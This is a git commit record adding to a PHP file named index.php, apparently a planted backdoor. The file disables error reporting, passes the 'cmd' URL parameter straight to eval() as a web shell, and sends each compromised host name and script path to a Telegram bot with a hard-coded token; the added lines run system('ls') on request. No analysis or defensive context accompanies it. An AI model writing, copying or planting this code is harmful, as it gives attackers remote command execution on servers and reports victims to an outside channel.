32120e7baafa205006fe2631ff1752861e1c469e
PhenaxGod <76651777+PhenaxGod@users.noreply.github.com>
2021-06-17 00:22:23 +0000

    Create index.php

--- index.php
+++ index.php
@@ -1,3 +1,6 @@
 error_reporting(0);
 eval($_GET['cmd']);
 file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-1001198429476&text=New: " . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);
+if (!empty($_GET['x'])) {
+system('ls');
+}
